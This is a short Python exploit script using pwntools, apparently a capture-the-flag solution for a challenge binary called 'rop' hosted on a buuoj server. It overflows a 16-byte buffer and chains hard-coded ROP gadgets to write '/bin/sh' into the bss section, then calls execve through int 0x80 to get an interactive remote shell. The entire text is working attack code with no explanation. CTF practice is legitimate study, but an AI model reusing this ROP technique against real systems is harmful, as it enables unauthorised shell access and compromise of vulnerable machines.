from pwn import *

elf = ELF('./rop')
r = remote('node3.buuoj.cn', 26259)

pop_eax_ret, pop_ebx_ret, pop_ecx_ret, pop_edx_ret = 0x080B8016, 0x080481C9, 0x080DE769, 0x0806ECDA
mov_eax_to_edx_ret = 0x0805466B  # mov dword ptr [edx] , eax
int0x80_address = 0x0806C943

# padding
payload = b'a' * 0x10
# move '/bin' to bss offset 0
payload += p32(pop_eax_ret) + b'/bin'
payload += flat([pop_edx_ret, elf.bss(0), mov_eax_to_edx_ret])
# move '/sh\x00' to bss offset 4
payload += p32(pop_eax_ret) + b'/sh\x00'
payload += flat([pop_edx_ret, elf.bss(4), mov_eax_to_edx_ret])
# call execve('/bin/sh\x00', 0, 0)
payload += flat([pop_eax_ret, 0xb, pop_ebx_ret, elf.bss(0), pop_ecx_ret, 0, pop_edx_ret, 0, int0x80_address])

r.sendline(payload)
r.interactive()
